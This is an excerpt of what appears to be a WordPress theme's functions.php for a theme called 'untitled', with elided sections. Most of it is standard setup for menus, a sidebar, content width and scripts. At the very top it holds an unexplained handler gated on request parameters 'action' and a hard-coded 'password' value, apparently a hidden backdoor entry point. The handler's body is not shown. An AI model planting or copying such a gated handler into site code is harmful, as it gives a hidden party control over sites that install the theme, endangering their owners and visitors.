...
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'afa88b64c69e9c078d55d7c07fc8b60c'))
	{
...
if ( ! function_exists( 'untitled_setup' ) ) :
	...
	function untitled_setup() {
		...
		register_nav_menus( array(
			'menu-1' => esc_html__( 'Primary', 'untitled' ),
		) );
 ...
 */
function untitled_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'untitled_content_width', 640 );
}
add_action( 'after_setup_theme', 'untitled_content_width', 0 );
...
function untitled_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'untitled' ),
		'id'            => 'sidebar-1',
		'description'   => esc_html__( 'Add widgets here.', 'untitled' ),
...
function untitled_scripts() {
	wp_enqueue_style( 'untitled-style', get_stylesheet_uri() );

	wp_enqueue_script( 'untitled-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20151215', true );

	wp_enqueue_script( 'untitled-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20151215', true );
